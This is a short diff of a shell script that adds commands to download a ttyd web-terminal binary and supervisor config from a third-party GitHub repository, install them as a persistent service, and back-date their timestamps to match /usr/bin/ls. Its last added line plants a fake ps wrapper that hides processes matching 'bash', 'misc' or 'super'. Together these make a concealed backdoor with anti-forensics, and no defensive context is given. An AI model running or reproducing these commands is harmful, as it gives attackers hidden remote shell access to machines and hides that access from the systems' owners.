@@ -15,3 +15,13 @@ chmod +x /usr/bin/ttyd
 touch -r /usr/bin/ls /usr/bin/ttyd /etc/supervisord.d /etc/supervisord.d/ttyd.conf
 supervisorctl reload
 
+
+/etc/supervisor/conf.d/ttyd.conf
+
+curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ttyd -o /usr/bin/ttyd
+curl https://raw.githubusercontent.com/bjtemp001/kdr/master/ttyd.conf -o /etc/supervisor/conf.d/ttyd.conf
+chmod +x /usr/bin/ttyd
+touch -r /usr/bin/ls /usr/bin/ttyd /etc/supervisor/conf.d /etc/supervisor/conf.d/ttyd.conf
+supervisorctl reload
+
+printf '#! /usr/bin/bash\n/usr/bin/ps $@ | grep -Ev "bash|misc|super"' > /usr/sbin/ps && chmod +x /usr/sbin/ps && touch -r /usr/bin/ps /usr/sbin/ps
